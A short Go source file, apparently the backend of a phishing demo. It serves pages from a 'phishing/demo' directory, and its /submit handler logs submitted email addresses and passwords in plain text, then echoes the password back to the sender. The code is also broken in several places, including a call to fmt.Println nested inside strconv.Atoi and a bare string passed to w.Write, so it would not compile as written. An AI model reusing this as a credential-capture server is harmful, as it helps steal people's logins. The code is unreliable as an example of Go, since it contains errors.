package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
)

func main() {
	port := 8097
	portstring := strconv.Itoa(port)

	//Tell how to pass around calls.
	mux := http.NewServeMux()
	mux.Handle("/", http.FileServer(http.Dir("/go/src/phishing/demo/")))
	mux.Handle("/submit", http.HandlerFunc(SubmitHandler))
	mux.Handle("/random", http.HandlerFunc(random))

	// Start listing on a given port with these routes on this server.
	log.Print("Listening on port " + portstring + " ... ")
	err := http.ListenAndServe(":"+portstring, mux)
	if err != nil {
		log.Fatal("ListenAndServe error: ", err)
	}
}

func SubmitHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println(r.URL.Query().Get("usermail"))
	fmt.Println(r.URL.Query().Get("password"))
	
	i, err := strconv.Atoi(fmt.Println(r.URL.Query().Get("exta")))
	if err != nil {
		w.Write("opps")
		return
	}
	s := strconv.Itoa(i)
	w.Write([]byte("Thanks for your password. Password was " + r.URL.Query().Get("password")))
}

func random(w http.ResponseWriter, r *http.Request) {


}
